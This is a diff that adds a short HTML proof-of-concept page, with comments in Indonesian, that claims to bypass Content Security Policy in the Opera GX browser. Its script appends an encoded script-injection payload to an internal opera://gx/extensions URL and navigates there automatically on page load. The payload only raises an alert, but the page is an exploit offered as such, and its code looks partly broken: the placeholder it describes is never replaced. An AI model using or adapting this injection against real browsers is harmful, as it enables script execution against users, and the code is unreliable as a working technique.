@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Opera GX CSP Bypass PoC</title>
+</head>
+<body>
+  <h1>Opera GX CSP Bypass PoC</h1>
+
+  <script>
+    // Step 1: Craft payload ke handler internal
+    let payload = "opera://gx/extensions/e0?marker=__POC__";
+
+    // Step 2: Inject script melalui marker param
+    // Misalnya __POC__ diganti dengan onload JS
+    let exploit = payload + encodeURIComponent(
+      '"><script>alert(`CSP BYPASS in Opera GX!`)</script>'
+    );
+
+    // Step 3: Auto-navigate
+    window.location = exploit;
+  </script>
+
+</body>
+</html>
